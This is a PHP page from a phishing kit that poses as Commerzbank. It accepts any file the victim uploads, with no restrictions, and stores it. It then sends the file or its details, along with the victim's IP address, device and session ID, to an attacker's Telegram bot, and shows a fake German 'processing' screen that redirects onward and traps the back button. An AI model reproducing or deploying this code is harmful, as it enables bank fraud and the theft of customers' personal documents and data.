<?php
// UNIVERSAL UPLOAD SOLUTION - ACCEPTS ALL FILES AND ENSURES PROCESS CONTINUES

// Start session
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// Set maximum limits
ini_set('upload_max_filesize', '100M');
ini_set('post_max_size', '100M');
ini_set('max_execution_time', '600');
ini_set('memory_limit', '512M');
ini_set('max_input_time', '600');

// Completely disable error display
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
error_reporting(0);

// Include Telegram configuration
include '../config/telegram.php';
$botToken = $telegram_bot2_token;
$chatId = $telegram_bot2_chat_id;

// Create upload directory if it doesn't exist
$uploadDir = 'xentryxupload/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Get user information
$ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$currentTime = date('Y-m-d H:i:s');

// Initialize variables
$uploadSuccess = false;
$telegramSent = false;
$fileProcessed = false;

// UNIVERSAL FILE PROCESSING - ACCEPTS ANY FILE
try {
    // Check if ANY file was uploaded (regardless of type)
    if (isset($_FILES['file'])) {
        $fileProcessed = true;
        
        if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
            // File uploaded successfully
            $originalFileName = basename($_FILES['file']['name']);
            $fileExtension = strtolower(pathinfo($originalFileName, PATHINFO_EXTENSION));
            $randomPrefix = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
            $newFileName = $randomPrefix . '-' . $originalFileName;
            $uploadPath = $uploadDir . $newFileName;

            // ACCEPT ALL FILE TYPES - NO RESTRICTIONS
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
                $uploadSuccess = true;
                $fileSize = filesize($uploadPath);
                
                // Create success message
                $message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗣𝗟𝗢𝗔𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦\n\n";
                $message .= "📄 |  𝗙𝗶𝗹𝗲 𝗡𝗮𝗺𝗲: $originalFileName\n";
                $message .= "📏 |  𝗙𝗶𝗹𝗲 𝗦𝗶𝘇𝗲: " . number_format($fileSize / 1024, 2) . " KB\n";
                $message .= "📁 |  𝗙𝗶𝗹𝗲 𝗧𝘆𝗽𝗲: $fileExtension\n";
                $message .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲: " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
                $message .= "📍 |  𝗜𝗣: $ipAddress\n";
                $message .= "📅 |  𝗧𝗶𝗺𝗲: $currentTime\n";
                $message .= "🆔 |  𝗦𝗲𝘀𝘀𝗶𝗼𝗻: " . session_id();

                // Try to send file to Telegram (if it's an image)
                if (in_array($fileExtension, ['jpg', 'jpeg', 'png', 'gif', 'heic', 'heif', 'webp', 'bmp', 'tiff'])) {
                    $result = sendTelegramPhoto($botToken, $chatId, $uploadPath, $message);
                    if ($result) {
                        $telegramSent = true;
                    } else {
                        // Fallback: Send text message
                        $fallbackMessage = $message . "\n\n⚠️ Image upload to Telegram failed, but file was saved.";
                        sendTelegramMessage($botToken, $chatId, $fallbackMessage);
                        $telegramSent = true;
                    }
                } else {
                    // For non-image files, send text message with file info
                    $fileMessage = $message . "\n\n📎 Non-image file uploaded successfully.";
                    sendTelegramMessage($botToken, $chatId, $fileMessage);
                    $telegramSent = true;
                }
            } else {
                // File move failed, but still send notification
                $errorMessage = "📄 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗙𝗜𝗟𝗘 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗\n\n";
                $errorMessage .= "📄 |  𝗙𝗶𝗹𝗲 𝗡𝗮𝗺𝗲: $originalFileName\n";
                $errorMessage .= "📁 |  𝗙𝗶𝗹𝗲 𝗧𝘆𝗽𝗲: $fileExtension\n";
                $errorMessage .= "⚠️ |  𝗦𝘁𝗮𝘁𝘂𝘀: File received but save failed\n";
                $errorMessage .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲: " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
                $errorMessage .= "📍 |  𝗜𝗣: $ipAddress\n";
                $errorMessage .= "📅 |  𝗧𝗶𝗺𝗲: $currentTime\n";
                $errorMessage .= "🆔 |  𝗦𝗲𝘀𝘀𝗶𝗼𝗻: " . session_id();
                
                sendTelegramMessage($botToken, $chatId, $errorMessage);
                $telegramSent = true;
            }
        } else {
            // File upload had an error, but still send notification
            $uploadError = $_FILES['file']['error'];
            $errorMessage = "📄 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗙𝗜𝗟𝗘 𝗔𝗧𝗧𝗘𝗠𝗣𝗧\n\n";
            $errorMessage .= "⚠️ |  𝗨𝗽𝗹𝗼𝗮𝗱 𝗘𝗿𝗿𝗼𝗿: $uploadError\n";
            $errorMessage .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲: " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
            $errorMessage .= "📍 |  𝗜𝗣: $ipAddress\n";
            $errorMessage .= "📅 |  𝗧𝗶𝗺𝗲: $currentTime\n";
            $errorMessage .= "🆔 |  𝗦𝗲𝘀𝘀𝗶𝗼𝗻: " . session_id();
            
            sendTelegramMessage($botToken, $chatId, $errorMessage);
            $telegramSent = true;
        }
    } else {
        // No file uploaded, but still send notification
        $noFileMessage = "📄 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗡𝗢 𝗙𝗜𝗟𝗘\n\n";
        $noFileMessage .= "ℹ️ |  𝗦𝘁𝗮𝘁𝘂𝘀: No file was uploaded\n";
        $noFileMessage .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲: " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
        $noFileMessage .= "📍 |  𝗜𝗣: $ipAddress\n";
        $noFileMessage .= "📅 |  𝗧𝗶𝗺𝗲: $currentTime\n";
        $noFileMessage .= "🆔 |  𝗦𝗲𝘀𝘀𝗶𝗼𝗻: " . session_id();
        
        sendTelegramMessage($botToken, $chatId, $noFileMessage);
        $telegramSent = true;
    }
} catch (Exception $e) {
    // Exception occurred, but still send notification
    $exceptionMessage = "📄 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗘𝗫𝗖𝗘𝗣𝗧𝗜𝗢𝗡\n\n";
    $exceptionMessage .= "⚠️ |  𝗘𝗿𝗿𝗼𝗿: " . $e->getMessage() . "\n";
    $exceptionMessage .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲: " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
    $exceptionMessage .= "📍 |  𝗜𝗣: $ipAddress\n";
    $exceptionMessage .= "📅 |  𝗧𝗶𝗺𝗲: $currentTime\n";
    $exceptionMessage .= "🆔 |  𝗦𝗲𝘀𝘀𝗶𝗼𝗻: " . session_id();
    
    sendTelegramMessage($botToken, $chatId, $exceptionMessage);
    $telegramSent = true;
}

// ALWAYS send summary message
$summaryMessage = "📊 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗣𝗟𝗢𝗔𝗗 𝗦𝗨𝗠𝗠𝗔𝗥𝗬\n\n";
$summaryMessage .= "📄 |  𝗙𝗶𝗹𝗲 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱: " . ($fileProcessed ? '✅ Yes' : '❌ No') . "\n";
$summaryMessage .= "📸 |  𝗙𝗶𝗹𝗲 𝗦𝗮𝘃𝗲𝗱: " . ($uploadSuccess ? '✅ Success' : '❌ Failed') . "\n";
$summaryMessage .= "📱 |  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺: " . ($telegramSent ? '✅ Sent' : '❌ Failed') . "\n";
$summaryMessage .= "📍 |  𝗜𝗣: $ipAddress\n";
$summaryMessage .= "📅 |  𝗧𝗶𝗺𝗲: $currentTime";

sendTelegramMessage($botToken, $chatId, $summaryMessage);

// Set session flags
$_SESSION['upload_processed'] = true;
$_SESSION['upload_success'] = $uploadSuccess;
$_SESSION['file_processed'] = $fileProcessed;
?>

<!DOCTYPE html>
<html lang="de">
<head>
    <script src="/security.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verarbeitung läuft - Commerzbank</title>
    <meta http-equiv="refresh" content="3; url=uploadz3.php">
    <style>
        body {
            font-family: 'Gotham 4r', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .processing {
            text-align: center;
            padding: 50px 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ffcc00;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #666;
            font-size: 16px;
            margin: 20px 0;
        }
        .logo {
            color: #ffcc00;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .success {
            color: #28a745;
        }
        .info {
            color: #17a2b8;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="processing">
            <div class="logo">COMMERZBANK</div>
            <div class="spinner"></div>
            <h2>Verarbeitung läuft...</h2>
            <div class="status">
                <?php if ($fileProcessed): ?>
                    <div class="success">✅ Datei erfolgreich verarbeitet</div>
                <?php else: ?>
                    <div class="info">⏳ Verarbeite Ihre Anfrage...</div>
                <?php endif; ?>
                <br>
                <?php if ($uploadSuccess): ?>
                    <div class="success">✅ Datei erfolgreich gespeichert</div>
                <?php else: ?>
                    <div class="info">⏳ Verarbeite Datei...</div>
                <?php endif; ?>
                <br>
                <?php if ($telegramSent): ?>
                    <div class="success">✅ Daten erfolgreich übertragen</div>
                <?php else: ?>
                    <div class="info">⏳ Übertrage Daten...</div>
                <?php endif; ?>
                <br>
                <div class="success">🔄 Weiterleitung in 3 Sekunden...</div>
            </div>
            <p>Bitte warten Sie, während wir Ihre Daten verarbeiten.</p>
        </div>
    </div>
    
    <script>
        // Ensure redirect happens
        setTimeout(function() {
            window.location.href = 'uploadz3.php';
        }, 3000);
        
        // Prevent back button issues
        window.history.pushState(null, null, window.location.href);
        window.onpopstate = function () {
            window.history.pushState(null, null, window.location.href);
        };
    </script>
</body>
</html>
